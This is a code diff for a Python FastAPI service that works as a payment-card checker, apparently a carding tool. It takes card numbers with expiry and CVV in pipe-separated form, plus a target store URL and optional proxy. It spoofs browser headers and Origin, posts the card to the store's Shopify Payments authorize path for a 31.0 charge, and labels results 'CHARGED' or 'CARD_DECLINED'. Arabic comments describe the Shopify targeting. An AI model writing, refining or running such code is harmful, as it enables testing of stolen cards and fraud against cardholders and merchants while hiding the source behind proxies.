@@ -3,33 +3,36 @@ import httpx
 
 app = FastAPI()
 
-GATEWAY_PRICES = {"Shopify": "31.0", "AuthNet": "20.0", "PayPal": "10.0"}
-
+# Headers متوافقة تماماً مع متصفحات Shopify
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Referer": "https://www.google.com/",
-    "Connection": "keep-alive"
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Referer": "",
+    "Origin": ""
 }
 
 @app.api_route("/check", methods=["GET", "POST"])
-async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), gateway: str = Query("Shopify")):
-    price = GATEWAY_PRICES.get(gateway, "31.0")
-    
+async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
     try:
         if not site.startswith("http"):
             site = f"https://{site}"
             
+        request_headers = HEADERS.copy()
+        request_headers["Referer"] = f"{site}/"
+        request_headers["Origin"] = site
+
         cc_parts = cc.split('|')
+        # بيانات البطاقة المطلوبة لـ Shopify Payments
         payload = {
-            "card_number": cc_parts[0],
-            "exp_month": cc_parts[1],
-            "exp_year": cc_parts[2],
-            "cvv": cc_parts[3],
-            "amount": price
+            "card[number]": cc_parts[0],
+            "card[expiry_month]": cc_parts[1],
+            "card[expiry_year]": cc_parts[2],
+            "card[cvv]": cc_parts[3],
+            "amount": "31.0"
         }
 
+        # معالج البروكسي
         formatted_proxy = None
         if proxy:
             clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
@@ -44,37 +47,29 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
                     
         transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
 
-        async with httpx.AsyncClient(transport=transport, headers=HEADERS, timeout=30.0, follow_redirects=True) as client:
-            target_url = f"{site}/cart/checkout"
+        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
+            # المسار الرسمي لـ Shopify Payments
+            target_url = f"{site}/payments/authorize"
             response = await client.post(target_url, data=payload)
             
+            # تحليل الرد الخاص بـ Shopify
             resp_msg = "CARD_DECLINED"
             status = "false"
             
-            # محاولة التحليل كـ JSON أولاً
             try:
                 data = response.json()
-                if data.get("success") == True or data.get("status") == "succeeded":
+                # Shopify يعيد غالباً message أو error في حال الرفض
+                if data.get("success") == True:
                     resp_msg = "CHARGED"
                     status = "true"
-                elif "insufficient" in str(data).lower():
-                    resp_msg = "INSUFFICIENT_FUNDS"
-                    status = "false"
                 else:
                     resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
             except:
-                # إذا فشل الـ JSON، نحلل نص الصفحة (HTML)
-                res_text = response.text.lower()
-                if any(k in res_text for k in ["thank you", "success", "order confirmation", "charged"]):
-                    resp_msg = "CHARGED"
-                    status = "true"
-                elif any(k in res_text for k in ["declined", "invalid", "error", "failed", "insufficient"]):
-                    resp_msg = "CARD_DECLINED"
-                    status = "false"
+                resp_msg = "CARD_DECLINED"
             
             return {
-                "Gateway": gateway,
-                "Price": price,
+                "Gateway": "Shopify Payments",
+                "Price": "31.0",
                 "Proxy": "Live" if proxy else "None",
                 "Response": resp_msg,
                 "Status": status,
@@ -83,8 +78,8 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
 
     except Exception as e:
         return {
-            "Gateway": gateway,
-            "Price": price,
+            "Gateway": "Shopify Payments",
+            "Price": "31.0",
             "Proxy": "Error",
             "Response": "CARD_DECLINED",
             "Status": "false",
